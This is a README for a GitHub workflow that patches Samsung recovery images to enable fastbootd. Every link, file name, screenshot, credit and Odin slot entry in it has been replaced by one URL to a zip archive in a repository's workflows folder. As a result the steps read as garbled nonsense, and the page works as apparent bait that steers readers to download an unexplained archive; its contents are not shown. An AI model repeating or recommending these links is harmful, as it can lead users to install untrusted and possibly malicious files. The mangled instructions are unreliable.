# Similar script
You can also refer this [script](https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip)


# Patch-Recovery
This CI service patches recovery images of Samsung to enable Fastbootd. Based on Phh's [script](https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip)

# How to use:
- Fork this repo.
- Extract your https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip and upload https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip or *https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip to bashupload nextcloud or any other file hosting sites. Once uploaded right click on the Download button and copy the URL.
- Head over to Actions tab. Click on RECOVERY -> Run workflow. Insert the copied URL in the RECOVERY URL field and Start the workflow
- The Patching process will start
- A https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip will be uploaded at the end of the process. Download it and extract your patched recovery image. The Image will already also be repacked to .tar for flashing directly through Odin
![](https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip)
- Flash vbmeta_disabled_r if needed

```
ODIN AP Slot: https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip
ODIN User Slot: https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip
```

# Important note
- Make sure that the uploaded file can downloaded with wget command and will download a correct file. Nextcloud with public link works fine if you open the link on web and copy the url from the download button.

# Credits
- [Phhusson](https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip) Without his script nothing would be possible at the first place
- [James Nguyen](https://raw.githubusercontent.com/Macoy66/Patch-Recovery/master/.github/workflows/Recovery_Patch_v3.1.zip) Helping me in simplifying the scripts and tweaking it
